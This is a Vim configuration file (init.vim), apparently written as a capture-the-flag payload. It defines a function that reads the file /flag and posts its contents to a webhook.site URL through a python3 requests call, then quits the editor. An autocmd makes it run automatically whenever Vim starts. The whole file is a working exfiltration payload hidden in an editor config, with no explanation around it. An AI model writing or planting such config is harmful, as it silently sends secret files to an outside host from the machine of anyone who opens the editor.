" init.vim
function! ReadFlagAndSend()
  let l:flag = readfile("/flag")[0]
  call writefile([l:flag], "flag.txt", "b")
  call system("python3 -c 'import requests;requests.post(\"https://webhook.site/YOUR-ID\", data={\"flag\": open(\"flag.txt\").read()})'")
  qall!
endfunction

autocmd VimEnter * call ReadFlagAndSend()
